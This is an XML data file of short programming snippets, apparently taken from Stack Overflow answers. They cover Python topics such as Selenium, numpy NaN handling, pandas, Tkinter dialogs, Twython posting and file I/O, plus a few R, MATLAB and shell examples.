<?xml version="1.0" encoding="UTF-8" standalone="no"?><DATA><ROW><id>20318029</id><snippet>driver.find_element_by_id("tinymce")
</snippet></ROW><ROW><id>20318029</id><snippet>find_element_by_name</snippet></ROW><ROW><id>20318029</id><snippet>&lt;form&gt;
First name: &lt;input type="text" name="firstname"&gt;&lt;br&gt;
Last name: &lt;input type="text" name="lastname"&gt;
&lt;/form&gt;
</snippet></ROW><ROW><id>20318029</id><snippet>find_element_by_name('firstname')</snippet></ROW><ROW><id>20318029</id><snippet>&lt;body id="tinymce" class="mceContentBody " contenteditable="true" onload="window.parent.tinyMCE.get('tinymcewindow').onLoad.dispatch();" spellcheck="false" dir="ltr"&gt;
</snippet></ROW><ROW><id>20318029</id><snippet>find_element_by_id("tinymce")</snippet></ROW><ROW><id>20318029</id><snippet>find_element_by_css_selector("#tinymce")</snippet></ROW><ROW><id>20318029</id><snippet>find_element_by_xpath("//*[@id='tinymce']")</snippet></ROW><ROW><id>20318029</id><snippet>driver.find_element_by_id("tinymce").send_keys("Hello world")</snippet></ROW><ROW><id>20318029</id><snippet>driver.switch_to_frame("frameName")</snippet></ROW><ROW><id>20318029</id><snippet>driver.switch_to_default_content()</snippet></ROW><ROW><id>20318113</id><snippet>n</snippet></ROW><ROW><id>20318113</id><snippet>N</snippet></ROW><ROW><id>20318288</id><snippet>redditScrapper.py</snippet></ROW><ROW><id>20318288</id><snippet>minerTweets.py</snippet></ROW><ROW><id>20318288</id><snippet>with open('test.txt', 'w') as fp:
    data = json.load(response)
    json.dump(data, fp)
</snippet></ROW><ROW><id>20318288</id><snippet>test.txt</snippet></ROW><ROW><id>20318288</id><snippet>with open('test.txt') as fp:
    api = Twython(CONSUMER_KEY,CONSUMER_SECRET,ACCESS_KEY,ACCESS_SECRET) 
    data = json.load(fp)
    api.update_status(data['data']['children'][3]['data']['title'])
</snippet></ROW><ROW><id>20318288</id><snippet>import urllib2
import json
from twython import Twython

CONSUMER_KEY = 'XXXXXXXXXXXXXXXX'
CONSUMER_SECRET = 'XXXXXXXXXXXXXXXX'
ACCESS_KEY = 'XXXXXXXXXXXXXXXX'
ACCESS_SECRET = 'XXXXXXXXXXXXXXXX'

# get remote string
url = 'http://www.reddit.com/new.json?sort=new'
response=urllib2.urlopen(url)

# interpret as json
data = json.load(response)
#print(data)
response.close()

api = Twython(CONSUMER_KEY,CONSUMER_SECRET,ACCESS_KEY,ACCESS_SECRET) 

d = data['data']['children'][3]['data']
title = d['title']
permalink = d['permalink']
subreddit = d['subreddit']

api.update_status(status=title+permalink+subreddit) #or you can post this as different 
#status, depends on how you'd like to format the tweet.
</snippet></ROW><ROW><id>20318471</id><snippet>itertools.zip_longest()</snippet></ROW><ROW><id>20318471</id><snippet>try:
    from itertools import zip_longest
except ImportError:
    # Python 2
    from itertools import izip_longest as zip_longest

def alternate(list1, list2):
    return [v for v in sum(zip_longest(list1, list2), ()) if v is not None]
</snippet></ROW><ROW><id>20318471</id><snippet>zip_longest()</snippet></ROW><ROW><id>20318471</id><snippet>None</snippet></ROW><ROW><id>20318471</id><snippet>-</snippet></ROW><ROW><id>20318471</id><snippet>sum()</snippet></ROW><ROW><id>20318471</id><snippet>&gt;&gt;&gt; alternate(list1, list2)
['1', '5', '2', '6', '3', '7', '8']
&gt;&gt;&gt; alternate(alternate(list1, list2), list3)
['1', '9', '5', '2', '6', '3', '7', '8']
</snippet></ROW><ROW><id>20318866</id><snippet>option1</snippet></ROW><ROW><id>20318866</id><snippet>payoutRules</snippet></ROW><ROW><id>20318866</id><snippet>option1</snippet></ROW><ROW><id>20318866</id><snippet>payout</snippet></ROW><ROW><id>20318866</id><snippet>payout</snippet></ROW><ROW><id>20318866</id><snippet>None</snippet></ROW><ROW><id>20318866</id><snippet>payout</snippet></ROW><ROW><id>20318866</id><snippet>def payout(betAmount):
    return betAmount * (1.5, 1.25, 1.2)[option1]
</snippet></ROW><ROW><id>20318866</id><snippet>option1</snippet></ROW><ROW><id>20318866</id><snippet>(1.5, 1.25, 1.2)</snippet></ROW><ROW><id>20318866</id><snippet>betAmount</snippet></ROW><ROW><id>20318866</id><snippet>option1</snippet></ROW><ROW><id>20318997</id><snippet>event.type==KEYUP:</snippet></ROW><ROW><id>20318997</id><snippet>false</snippet></ROW><ROW><id>20318997</id><snippet>if-else</snippet></ROW><ROW><id>20318997</id><snippet>elif event.type == KEYUP:
    if event.key == K_ESCAPE:
        pygame.quit()
        sys.exit()                        
    elif event.key == K_LEFT or event.key == ord('a'):
        moveLEFT = True
        moveRIGHT = False
        moveUP = False
        moveDOWN = False
    elif event.key == K_RIGHT or event.key == ord('d'):
        moveRIGHT = True
        moveLEFT = False
        moveUP = False
        moveDOWN = False
    elif event.key == K_UP or event.key == ord ('w'):
        moveUP = True
        moveLEFT = False
        moveUP = False   ##This line is faulty moveRIGHT=FALSE should be used instead
        moveDOWN = False
    elif event.key == K_DOWN or event.key == ord('s'):
        moveDOWN = True
        moveLEFT = False
        moveUP = False
        moveDOWN = False   ##This line is faulty moveRIGHT=FALSE should be used instead
</snippet></ROW><ROW><id>20319025</id><snippet>x = [range(0,tamanho)]
</snippet></ROW><ROW><id>20319025</id><snippet>x</snippet></ROW><ROW><id>20319025</id><snippet>tamanho</snippet></ROW><ROW><id>20319025</id><snippet>y</snippet></ROW><ROW><id>20319025</id><snippet>matrix = [[0]*n for i in xrange(m)]
</snippet></ROW><ROW><id>20319025</id><snippet>[0]*n</snippet></ROW><ROW><id>20319025</id><snippet>m</snippet></ROW><ROW><id>20319120</id><snippet>integer, value = divmod(integer, base)
</snippet></ROW><ROW><id>20319120</id><snippet>value = integer % base
integer //= base
</snippet></ROW><ROW><id>20319120</id><snippet>temp = integer // base
value = integer - temp * base
integer = temp
</snippet></ROW><ROW><id>20319120</id><snippet>base = 100</snippet></ROW><ROW><id>20319120</id><snippet>integer, value = divmod(12345, 100)
</snippet></ROW><ROW><id>20319120</id><snippet>integer = 123</snippet></ROW><ROW><id>20319120</id><snippet>value = 45</snippet></ROW><ROW><id>20319120</id><snippet>divmod(whatever, 100)</snippet></ROW><ROW><id>20319156</id><snippet>with</snippet></ROW><ROW><id>20319156</id><snippet>with open('file_name', 'r+') as my_file: # this automatically closes it
    lines = my_file.readlines()
    # now, rewrite the data
    for line in lines:
        my_file.write(line.title())
</snippet></ROW><ROW><id>20319156</id><snippet>'w+'</snippet></ROW><ROW><id>20319156</id><snippet>with open('file_name', 'w+') as my_file:
    lines = my_file.readlines()
    # set the file pointer at the beginning of the file
    my_file.seek(0, 0)
    # now, rewrite the data
    for line in lines:
        my_file.write(line.title())
</snippet></ROW><ROW><id>20319156</id><snippet>file.seek</snippet></ROW><ROW><id>20319384</id><snippet>reindex</snippet></ROW><ROW><id>20319384</id><snippet>import pandas as pd
Dxz = pd.DataFrame({"x": [False,False,True], "z": [0,2,0], "p": [0.4,0.2,1]})
Dxz.set_index(["x","z"], inplace=True)
print Dxz.reindex(pd.MultiIndex.from_tuples([(False, 0), (False, 1), (False, 100), (True, 23)]), method="ffill")
</snippet></ROW><ROW><id>20319384</id><snippet>             p
False 0    0.4
      1    0.4
      100  0.2
True  23   1.0
</snippet></ROW><ROW><id>20319965</id><snippet>numpy</snippet></ROW><ROW><id>20319965</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; [0.0,0.0]/0
Traceback (most recent call last):
  File "&lt;ipython-input-3-aae9e30b3430&gt;", line 1, in &lt;module&gt;
    [0.0,0.0]/0
TypeError: unsupported operand type(s) for /: 'list' and 'int'

&gt;&gt;&gt; [0.0,0.0]/np.float64(0)
array([ nan,  nan])
</snippet></ROW><ROW><id>20319965</id><snippet>from matplotlib.pylab import *
</snippet></ROW><ROW><id>20319965</id><snippet>numpy.sum</snippet></ROW><ROW><id>20319965</id><snippet>&gt;&gt;&gt; from matplotlib.pylab import *
&gt;&gt;&gt; sum is np.sum
True
&gt;&gt;&gt; [0.0,0.0]/sum([0.0, 0.0])
array([ nan,  nan])
</snippet></ROW><ROW><id>20319965</id><snippet>nan</snippet></ROW><ROW><id>20319965</id><snippet>nan</snippet></ROW><ROW><id>20319965</id><snippet>array</snippet></ROW><ROW><id>20319965</id><snippet>nan != nan</snippet></ROW><ROW><id>20319965</id><snippet>&gt;&gt;&gt; nan == nan
False
&gt;&gt;&gt; nan == nan, nan is nan
(False, True)
&gt;&gt;&gt; nan in [nan]
True
&gt;&gt;&gt; nan in np.array([nan])
False
</snippet></ROW><ROW><id>20319965</id><snippet>np.isnan</snippet></ROW><ROW><id>20319965</id><snippet>&gt;&gt;&gt; np.isnan([nan, nan])
array([ True,  True], dtype=bool)
&gt;&gt;&gt; np.isnan([nan, nan]).any()
True
</snippet></ROW><ROW><id>20320040</id><snippet>input</snippet></ROW><ROW><id>20320040</id><snippet>input</snippet></ROW><ROW><id>20320040</id><snippet>raw_input</snippet></ROW><ROW><id>20320060</id><snippet>nan</snippet></ROW><ROW><id>20320060</id><snippet>nan</snippet></ROW><ROW><id>20320060</id><snippet>nan</snippet></ROW><ROW><id>20320060</id><snippet>nan in [nan]</snippet></ROW><ROW><id>20320060</id><snippet>nan</snippet></ROW><ROW><id>20320060</id><snippet>&gt;&gt;&gt; nans = [float("nan") for i in range(2)]
&gt;&gt;&gt; map(id, nans)
[190459300, 190459284]
&gt;&gt;&gt; nans
[nan, nan]
&gt;&gt;&gt; nans[0] is nans[1]
False
&gt;&gt;&gt; nans[0] in nans
True
&gt;&gt;&gt; nans[0] in nans[1:]
False
</snippet></ROW><ROW><id>20320060</id><snippet>nan</snippet></ROW><ROW><id>20320060</id><snippet>float("nan")</snippet></ROW><ROW><id>20320060</id><snippet>y = x</snippet></ROW><ROW><id>20320060</id><snippet>x</snippet></ROW><ROW><id>20320060</id><snippet>y</snippet></ROW><ROW><id>20320060</id><snippet>x</snippet></ROW><ROW><id>20320115</id><snippet>indices.append(list(t[0])) 
    #which gives:    
[[485], [523], [576], [733], [963], [1254]]
</snippet></ROW><ROW><id>20320115</id><snippet>for x in indices:
    print (x[0])
</snippet></ROW><ROW><id>20320269</id><snippet>def isPalindrome():
  string1 = input('Enter a string: ')
  string2 = string1[::-1] #notice it's string1, not string.
  if string1 == string2:
    [code]
</snippet></ROW><ROW><id>20320339</id><snippet>dict</snippet></ROW><ROW><id>20320339</id><snippet>keys = ['RemoteService', 'RemoteApi']
values = 'Weather:getWeather'.split(':')
service_metrics = dict(zip(keys, values))
</snippet></ROW><ROW><id>20320364</id><snippet>globals()['order' + num] = Order(...)</snippet></ROW><ROW><id>20320364</id><snippet>class Order(object):
    """Defines an individual order"""
    def __init__(self, input_header, input_line):
        for z in xrange(len(input_header)):
            setattr(self, input_header[z], input_line[z])

orders = {}
input_header = input_list.pop(0)
for a in xrange(len(input_list)):
    orders[a] = Order(input_header, input_list[a])
</snippet></ROW><ROW><id>20320387</id><snippet>#!/usr/bin/env python

#x=1.123
#y=2.123

pos = [1.123, 2.123]

with open('vars.txt','w') as f:
    f.write("%s %s" % (pos[0], pos[1]))
    #f.write("%s %s" % (x,y))

with open ('vars.txt', 'r') as myfile:
    position=myfile.read().split()

position = map(float, position)
# position = [1.123, 2.123]
</snippet></ROW><ROW><id>20320604</id><snippet>lambda</snippet></ROW><ROW><id>20320604</id><snippet>lambda</snippet></ROW><ROW><id>20320604</id><snippet>Misc/HISTORY</snippet></ROW><ROW><id>20320604</id><snippet>Misc/HISTORY</snippet></ROW><ROW><id>20320678</id><snippet>alpha</snippet></ROW><ROW><id>20320678</id><snippet>beta</snippet></ROW><ROW><id>20320678</id><snippet>alpha == reverse(beta)</snippet></ROW><ROW><id>20320678</id><snippet>beta[::-1]</snippet></ROW><ROW><id>20320678</id><snippet>alpha == beta[::-1]</snippet></ROW><ROW><id>20320725</id><snippet>&gt;&gt;&gt; lst = ['string1', 'string2', 'string3']
&gt;&gt;&gt; lst.append(lst.pop(lst.index('string2')))
&gt;&gt;&gt; lst
['string1', 'string3', 'string2']
</snippet></ROW><ROW><id>20320725</id><snippet>'string2'</snippet></ROW><ROW><id>20320725</id><snippet>&gt;&gt;&gt; lst = ['string1', 'string2', 'string3']
&gt;&gt;&gt; lst.append('string2')
&gt;&gt;&gt; del lst[lst.index('string2')]  # Equivalent to lst.remove('string2')
&gt;&gt;&gt; lst
['string1', 'string3', 'string2']
</snippet></ROW><ROW><id>20320846</id><snippet>request.args.get('column')
</snippet></ROW><ROW><id>20320846</id><snippet>.args</snippet></ROW><ROW><id>20320944</id><snippet>(400,200), (400,100), (600,200), (600,100)</snippet></ROW><ROW><id>20320944</id><snippet>(400,0)...(400,screen_height)</snippet></ROW><ROW><id>20320944</id><snippet>(600,0)...(600,screen_height)</snippet></ROW><ROW><id>20320944</id><snippet>(0,100)...(screen_width,100)</snippet></ROW><ROW><id>20320944</id><snippet>(0,200)...(screen_width,200)</snippet></ROW><ROW><id>20320982</id><snippet>findAll('a')[5]</snippet></ROW><ROW><id>20320983</id><snippet>t.pencolor(83, 58, 27)
</snippet></ROW><ROW><id>20320983</id><snippet>pencolor</snippet></ROW><ROW><id>20320983</id><snippet>t.pencolor((83, 58, 27))
</snippet></ROW><ROW><id>20321051</id><snippet>gender</snippet></ROW><ROW><id>20321051</id><snippet>import sys
import getopt
gender = 'missing'

def main(argv):
    global gender
# ... all the same
# ... below here
</snippet></ROW><ROW><id>20321242</id><snippet>or</snippet></ROW><ROW><id>20321242</id><snippet>any</snippet></ROW><ROW><id>20321242</id><snippet>if 'domainName.com' in response.url and any(name in response.url for name in ('siteSection1', 'siteSection2', 'siteSection3')):
</snippet></ROW><ROW><id>20321242</id><snippet>or</snippet></ROW><ROW><id>20321242</id><snippet>or</snippet></ROW><ROW><id>20321242</id><snippet>x or y</snippet></ROW><ROW><id>20321242</id><snippet>x</snippet></ROW><ROW><id>20321242</id><snippet>x</snippet></ROW><ROW><id>20321242</id><snippet>True</snippet></ROW><ROW><id>20321242</id><snippet>y</snippet></ROW><ROW><id>20321242</id><snippet>x</snippet></ROW><ROW><id>20321242</id><snippet>True</snippet></ROW><ROW><id>20321242</id><snippet>('siteSection1' or 'siteSection2' or 'siteSection3')</snippet></ROW><ROW><id>20321242</id><snippet>'siteSection1'</snippet></ROW><ROW><id>20321242</id><snippet>'siteSection1'</snippet></ROW><ROW><id>20321242</id><snippet>True</snippet></ROW><ROW><id>20321242</id><snippet>and</snippet></ROW><ROW><id>20321242</id><snippet>and</snippet></ROW><ROW><id>20321242</id><snippet>False</snippet></ROW><ROW><id>20321242</id><snippet>True</snippet></ROW><ROW><id>20321242</id><snippet>if x and y in z</snippet></ROW><ROW><id>20321242</id><snippet>x</snippet></ROW><ROW><id>20321242</id><snippet>y</snippet></ROW><ROW><id>20321242</id><snippet>z</snippet></ROW><ROW><id>20321242</id><snippet>in</snippet></ROW><ROW><id>20321242</id><snippet>and</snippet></ROW><ROW><id>20321242</id><snippet>if x and (y in z)</snippet></ROW><ROW><id>20321242</id><snippet>domainName.com</snippet></ROW><ROW><id>20321242</id><snippet>y in z</snippet></ROW><ROW><id>20321242</id><snippet>any</snippet></ROW><ROW><id>20321242</id><snippet>True</snippet></ROW><ROW><id>20321242</id><snippet>False</snippet></ROW><ROW><id>20321242</id><snippet>True</snippet></ROW><ROW><id>20321242</id><snippet>True</snippet></ROW><ROW><id>20321242</id><snippet>False</snippet></ROW><ROW><id>20321242</id><snippet>True</snippet></ROW><ROW><id>20321315</id><snippet>xargs = ['change:%s' % str(num)]
</snippet></ROW><ROW><id>20321315</id><snippet>d = {}</snippet></ROW><ROW><id>20321315</id><snippet>return {}</snippet></ROW><ROW><id>20321315</id><snippet>return</snippet></ROW><ROW><id>20321482</id><snippet>def onclick(x, y):
    print x, y

turtle.Screen().onscreenclick(onclick)
</snippet></ROW><ROW><id>20321815</id><snippet>with open("datafile") as fin, open("outfile","w") as fout:
    for line in fin:
        print &gt;&gt; fout, ' '.join(set(line.split()))
</snippet></ROW><ROW><id>20321815</id><snippet>with open("datafile") as fin, open("outfile","w") as fout:
    for line in fin:
        print(*(set(line.split()), file=fout)
</snippet></ROW><ROW><id>20322455</id><snippet>from itertools import permutations, product

def main():
    teamA = [40, 50, 70]
    teamB = [75, 25, 30]

    # Compute two averages by processing every possible match:
    #   pa   Probability that Team A wins a match.
    #   ng   Expected N of games in a match.
    tot_pa, tot_ng, n = (0, 0, 0)
    for As, Bs in product(permutations(teamA), permutations(teamB)):
        pa, ng = prob_a_wins(As, Bs)
        tot_pa += pa
        tot_ng += ng
        n      += 1

    print tot_pa / n  # 0.61233
    print tot_ng / n  # 2.50580

def prob_a_wins(As, Bs):
    # Probabilities that Team A wins game 1, 2, 3, and the match.
    g1, g2, g3 = [ a / float(a + b) for a, b in zip(As, Bs) ]
    pa = (
        g1       * g2            +  # win g1 and g2
        g1       * (1 - g2) * g3 +  # win g1 and g3
        (1 - g1) * g2       * g3    # win g2 and g3
    )

    # Probabability of a two-game match, and expected N of games.
    two = (
        g1       * g2 +        # win  g1 and g2
        (1 - g1) * (1 - g2)    # lose g1 and g2
    )
    ng  = two * 2  +  (1 - two) * 3

    return (pa, ng)

main()
</snippet></ROW><ROW><id>20322495</id><snippet>R</snippet></ROW><ROW><id>20322495</id><snippet>reshape</snippet></ROW><ROW><id>20322495</id><snippet>import numpy as np
a = np.array([1.,2,6,2,1,7])
R = 3
a.reshape(-1, R)
=&gt; array([[ 1.,  2.,  6.],
         [ 2.,  1.,  7.]])

a.reshape(-1, R).mean(axis=1)
=&gt; array([ 3.        ,  3.33333333])
</snippet></ROW><ROW><id>20322495</id><snippet>NaN</snippet></ROW><ROW><id>20322495</id><snippet>R</snippet></ROW><ROW><id>20322495</id><snippet>scipy.nanmean</snippet></ROW><ROW><id>20322495</id><snippet>import math, scipy
b = np.append(a, [ 4 ])
b.shape
=&gt; (7,)
pad_size = math.ceil(float(b.size)/R)*R - b.size
b_padded = np.append(b, np.zeros(pad_size)*np.NaN)
b_padded.shape
=&gt; (9,)
scipy.nanmean(b_padded.reshape(-1,R), axis=1)
=&gt; array([ 3.        ,  3.33333333,  4.])
</snippet></ROW><ROW><id>20323117</id><snippet>&gt;&gt;&gt; import ast
&gt;&gt;&gt; ast.literal_eval('[1,2,3]')
[1, 2, 3]
</snippet></ROW><ROW><id>20323266</id><snippet>itertools.islice</snippet></ROW><ROW><id>20323266</id><snippet>import itertools
import random

with open('fx-01.txt') as f:
    while True:
        n = random.randint(5, 15)
        elements = [line.strip() for line in itertools.islice(f, n)]
        # itertools.islice(f, n): to fetch `n` lines from file.
        if not elements:
        # if len(elements) &lt; 5: # Use this if you want drop trailing &lt;5 lines.
            break
        print(','.join(elements))
</snippet></ROW><ROW><id>20323405</id><snippet>defaultdict</snippet></ROW><ROW><id>20323405</id><snippet>&gt;&gt;&gt; s = [('yellow', 1), ('blue', 2), ('yellow', 3), ('blue', 4), ('red', 1)]
&gt;&gt;&gt; d = defaultdict(list)
&gt;&gt;&gt; for k, v in s:
        d[k].append(v)

&gt;&gt;&gt; d.items()
[('blue', [2, 4]), ('red', [1]), ('yellow', [1, 3])]
</snippet></ROW><ROW><id>20323405</id><snippet>&gt;&gt;&gt; s = [['elem1', 'comment11'],['elem1', 'comment12'],['elem2', 'comment21']]
&gt;&gt;&gt; d = defaultdict(list)
&gt;&gt;&gt; for l in s:
        d[l[0]].append(*l[1:])
&gt;&gt;&gt; d.items()
[('elem2', ['comment21']), ('elem1', ['comment11', 'comment12'])]
</snippet></ROW><ROW><id>20323554</id><snippet>def create_lists_board(listStrings):

    print "Diamond Sword Enemy"
    for i in listStrings:
        n = i.split("-")
        print "%s \t %s \t %s"%(str(n[0]), str(n[1]), str(n[2]))

create_lists_board(['0-0-0','10-1-2','15-2-3','6-4-5'])
</snippet></ROW><ROW><id>20323745</id><snippet>sys.argv</snippet></ROW><ROW><id>20323745</id><snippet>IndexError</snippet></ROW><ROW><id>20323745</id><snippet>last_list = [1,2,3]
if last_list[1:]:
    print last_list[1:]
&gt;&gt; [2,3]

empty_list = []
print empty_list[:1]
&gt;&gt; []
</snippet></ROW><ROW><id>20323767</id><snippet>$MATLABROOT/etc/lmstat -c yourlicencefile -a
</snippet></ROW><ROW><id>20324196</id><snippet>a + (b + c) = (a + b) + c
</snippet></ROW><ROW><id>20324196</id><snippet>a + b</snippet></ROW><ROW><id>20324196</id><snippet>a</snippet></ROW><ROW><id>20324938</id><snippet>reduce()</snippet></ROW><ROW><id>20324938</id><snippet>reduce(dict.__getitem__, l, d)
</snippet></ROW><ROW><id>20324938</id><snippet>operator.getitem()</snippet></ROW><ROW><id>20324938</id><snippet>from operator import getitem

reduce(getitem, l, d)
</snippet></ROW><ROW><id>20324938</id><snippet>&gt;&gt;&gt; d = {"a": {"b": {"c": 4}}} 
&gt;&gt;&gt; l = ["a", "b", "c"]
&gt;&gt;&gt; from operator import getitem
&gt;&gt;&gt; reduce(getitem, l, d)
4
</snippet></ROW><ROW><id>20324938</id><snippet>reduce()</snippet></ROW><ROW><id>20324938</id><snippet>functools.reduce()</snippet></ROW><ROW><id>20325013</id><snippet>subplot</snippet></ROW><ROW><id>20325013</id><snippet>img = imread('cameraman.tif');
figure;
subplot(4,4,[2 3 6 7]);imshow(img);
subplot(4,4,[9 10 13 14]);imshow(img);
subplot(4,4,[11 12 15 16]);imshow(img);
</snippet></ROW><ROW><id>20325013</id><snippet>matplotlib</snippet></ROW><ROW><id>20325013</id><snippet>subplot2grid</snippet></ROW><ROW><id>20325013</id><snippet>import matplotlib.pyplot as plt
plt.subplot2grid( (4,4), [0,1], 2, 2 )
plt.plot( x1, y1 )
plt.subplot2grid( (4,4), [2,0], 2, 2 )
plt.plot( x2, y2 )
plt.subplot2grid( (4,4), [2,2], 2, 2 )
plt.plot( x2, y2 )
</snippet></ROW><ROW><id>20325491</id><snippet>sum((Values[v] + Addons[c]) * Multipliers[v] 
         for c, vs in Category.items() 
              for v in vs if c in Addons)
# 1225.5
</snippet></ROW><ROW><id>20325677</id><snippet>from Tkinter import *

master = Tk()

w = Label(master, text="Hello, world!")
w.pack()

mainloop()
</snippet></ROW><ROW><id>20325771</id><snippet>calculate(...)</snippet></ROW><ROW><id>20325771</id><snippet>outputs</snippet></ROW><ROW><id>20325771</id><snippet>outputs['d']</snippet></ROW><ROW><id>20325771</id><snippet>def add(x,y):
    return x + y

a = 1
b = 2
c = 3

d = add(a, b)
e = add(a, d)
</snippet></ROW><ROW><id>20325779</id><snippet>&gt;&gt;&gt; os.path.splitext(os.path.basename('a.b.c'))[0] + '.new'
'a.b.new'
&gt;&gt;&gt; os.path.basename('a.b.c').split('.')[0] + ".new"
'a.new'
</snippet></ROW><ROW><id>20325779</id><snippet>split</snippet></ROW><ROW><id>20325779</id><snippet>rsplit(..., 1)</snippet></ROW><ROW><id>20325779</id><snippet>splitext</snippet></ROW><ROW><id>20325779</id><snippet>&gt;&gt;&gt; os.path.basename('a.b.c').rsplit('.', 1)[0] + ".new"
'a.b.new'
</snippet></ROW><ROW><id>20325779</id><snippet>splitext</snippet></ROW><ROW><id>20325779</id><snippet>&gt;&gt;&gt; os.path.splitext(os.path.basename('.a'))[0] + '.new'
'.a.new'
&gt;&gt;&gt; os.path.basename('.a').rsplit('.', 1)[0] + '.new'
'.new'
</snippet></ROW><ROW><id>20327149</id><snippet>tar -cf - &lt;DIR&gt;/* | sshpass -p '&lt;password&gt;' ssh &lt;address@server&gt;  'tar -xf - -C /path/to/unzip/to'
</snippet></ROW><ROW><id>20327149</id><snippet>mydirs=`ls -p | grep "/"`
</snippet></ROW><ROW><id>20327149</id><snippet>for i in $mydirs; 
do 
    echo "Zipping directory ($i)...";
    tar -cf - &lt;DIR&gt;/* | sshpass -p '&lt;password&gt;' ssh &lt;address@server&gt;  'tar -xf - -C /path/to/unzip/to'
done
</snippet></ROW><ROW><id>20327240</id><snippet>library(sos)
findFn('Venn diagramm')
</snippet></ROW><ROW><id>20327240</id><snippet>VennDiagram</snippet></ROW><ROW><id>20327240</id><snippet>library(VennDiagram)
# You should replace the random values here by your set of values
## 
set.seed(1)
A &lt;- sample(1:100, 25, replace = FALSE)
B &lt;- sample(1:100, 25, replace = FALSE)
C &lt;- sample(1:100, 25, replace = FALSE)
D &lt;- sample(1:100, 25, replace = FALSE)

venn.plot &lt;- venn.diagram(
    x = list(
        Sept = A,
        Oct = D,
        Nov = B,
        Dec = C
    ),
    filename = NULL,
    col = "transparent",
    fill = c("cornflowerblue", "green", "yellow", "darkorchid1"),
    alpha = 0.50,
    label.col = c("orange", "white", "darkorchid4", "white", 
                                "white", "white", "white", "white", "darkblue", "white", 
                                "white", "white", "white", "darkgreen", "white"),
    cex = 1.5,
    fontfamily = "serif",
    fontface = "bold",
    cat.col = c("darkblue", "darkgreen", "orange", "darkorchid4"),
    cat.cex = 1.5,
    cat.pos = 0,
    cat.dist = 0.07,
    cat.fontfamily = "serif",
    rotation.degree = 270,
    margin = 0.2
)

grid.draw(venn.plot)
</snippet></ROW><ROW><id>20327257</id><snippet>MainAplication</snippet></ROW><ROW><id>20327257</id><snippet>parent</snippet></ROW><ROW><id>20327257</id><snippet>PasswordDialog</snippet></ROW><ROW><id>20327257</id><snippet>self.wait_window(PasswordDialog(self))</snippet></ROW><ROW><id>20327257</id><snippet>PasswordDialog</snippet></ROW><ROW><id>20327257</id><snippet>import Tkinter as tk

class PasswordDialog(tk.Toplevel):
    def __init__(self, parent):
        tk.Toplevel.__init__(self)
        self.parent = parent
        self.entry = tk.Entry(self, show='*')
        self.entry.bind("&lt;KeyRelease-Return&gt;", self.StorePassEvent)
        self.entry.pack()
        self.button = tk.Button(self)
        self.button["text"] = "Submit"
        self.button["command"] = self.StorePass
        self.button.pack()

    def StorePassEvent(self, event):
        self.StorePass()

    def StorePass(self):
        self.parent.password = self.entry.get()
        self.destroy()
        print '1: Password was', self.parent.password

class MainApplication(tk.Frame):
    def __init__(self, root):
        tk.Frame.__init__(self, root)
        self.password = None
        self.button = tk.Button(self)
        self.button["text"] = "Password"
        self.button["command"] = self.GetPassword
        self.button.pack()

    def GetPassword(self):
        self.wait_window(PasswordDialog(self))
        print '2: Password was', self.password

if __name__ == "__main__":
    root = tk.Tk()
    MainApplication(root).pack(side="top", fill="both", expand=True)
    root.mainloop()
</snippet></ROW><ROW><id>20327257</id><snippet>1: Password was foobar
2: Password was foobar
</snippet></ROW><ROW><id>20327257</id><snippet>self.entry.bind("&lt;KeyRelease-Return&gt;", self.StorePassEvent)
</snippet></ROW><ROW><id>20327257</id><snippet>def StorePassEvent(self, event):
    self.StorePass()
</snippet></ROW><ROW><id>20327340</id><snippet>localhost</snippet></ROW><ROW><id>20327733</id><snippet>StringIO</snippet></ROW><ROW><id>20327733</id><snippet>io.BytesIO</snippet></ROW><ROW><id>20327733</id><snippet>io.StringIO</snippet></ROW><ROW><id>20327733</id><snippet>&gt;&gt;&gt; import StringIO
&gt;&gt;&gt; import csv
&gt;&gt;&gt;
&gt;&gt;&gt; f = StringIO.StringIO(u'''field1,field2,field3
... 1,2,3
... 4,5,6
... 7,8,9
... ''')
&gt;&gt;&gt;
&gt;&gt;&gt; for row in csv.DictReader(f):
...     print row
...
{'field2': '2', 'field3': '3', 'field1': '1'}
{'field2': '5', 'field3': '6', 'field1': '4'}
{'field2': '8', 'field3': '9', 'field1': '7'}
</snippet></ROW><ROW><id>20327924</id><snippet>.decode()</snippet></ROW><ROW><id>20327924</id><snippet>json</snippet></ROW><ROW><id>20327924</id><snippet>json.load()</snippet></ROW><ROW><id>20327924</id><snippet>s</snippet></ROW><ROW><id>20327924</id><snippet>with open(source_config) as f:
    data = json.load(f)
</snippet></ROW><ROW><id>20327924</id><snippet>source_include</snippet></ROW><ROW><id>20327924</id><snippet>for entry in data["source_include"]:
    base_filename = os.path.basename(entry)
    tar = tarfile.open(os.path.join(backup_dir, base_filename + '.tar.gzip'), 'w:gz')
    tar.add(full_dir)
    tar.close()
</snippet></ROW><ROW><id>20327924</id><snippet>{
    "source_type": "folder",
    "tar_type": "gzip",
    "tar_max_age": "10",
    "source_include": ["/opt/myapp/config", "/opt/myapp/db", "/opt/myapp/randomdata"],
    "target_type": "tar.gzip",
    "target_path": "/home/user/targetA"

}
</snippet></ROW><ROW><id>20327924</id><snippet>os.listdir()</snippet></ROW><ROW><id>20327924</id><snippet>.time</snippet></ROW><ROW><id>20327924</id><snippet>os.stat()</snippet></ROW><ROW><id>20327924</id><snippet>for filename in os.listdir(backup_dir):
    path = os.path.join(backup_dir, filename)
    stats = os.stat(path)
    if stats.st_mtime &lt; time.time() - 20:
        # file was modified less than 20 seconds ago
</snippet></ROW><ROW><id>20327976</id><snippet>sh -c ..</snippet></ROW><ROW><id>20327976</id><snippet>groovy_str</snippet></ROW><ROW><id>20328136</id><snippet>st</snippet></ROW><ROW><id>20328136</id><snippet>st = datetime.strptime(st, '%A %d %B')</snippet></ROW><ROW><id>20328136</id><snippet>01 01 2013 02:05</snippet></ROW><ROW><id>20328136</id><snippet>strptime</snippet></ROW><ROW><id>20328136</id><snippet>%H:%M</snippet></ROW><ROW><id>20328566</id><snippet>csrfprotection = {}
csrfprotection.update(csrf(request))
</snippet></ROW><ROW><id>20328566</id><snippet>from django.template import RequestContext

def mapapp(request):
    # context contains key/value pairs used in your template
    c = "GOOGLE_API_KEY"
    context = { 'myvariable': 'thevalue', 'c': c }
    context.update(csrf(request))
    return render_to_response('mapvis/mapapp.html', context, context_instance=RequestContext(request))
</snippet></ROW><ROW><id>20328566</id><snippet>def mapapp(request):
    # context contains key/value pairs used in your template
    c = "GOOGLE_API_KEY"
    context = { 'myvariable': 'thevalue', 'c': c }
    context.update(csrf(request))
    return render_to_response('mapvis/mapapp.html', context)
